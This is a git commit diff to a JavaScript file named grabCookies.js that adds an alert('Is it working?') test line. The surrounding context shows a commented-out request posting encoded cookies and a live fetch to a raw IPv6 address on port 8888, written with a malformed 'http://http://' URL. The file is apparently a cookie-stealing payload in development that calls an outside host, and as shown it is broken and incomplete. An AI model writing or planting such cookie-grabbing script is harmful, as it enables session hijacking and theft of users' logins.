8a940f0b69a880cbf3b2d57563743369ceb6e3a4
ambordokan <91415607+ambordokan@users.noreply.github.com>
2023-02-01 20:21:38 -0500

    Update grabCookies.js

--- grabCookies.js
+++ grabCookies.js
@@ -7,7 +7,7 @@
 //  xhr.send("cookies=" + encodeURIComponent(cookies));
 //}
 
-
+alert("Is it working?");
 fetch("http://http://2601:582:c482:22a0:8ca9:986f:400d:1253:8888").then((res) => {
     return res.text();
 }).then(data => {
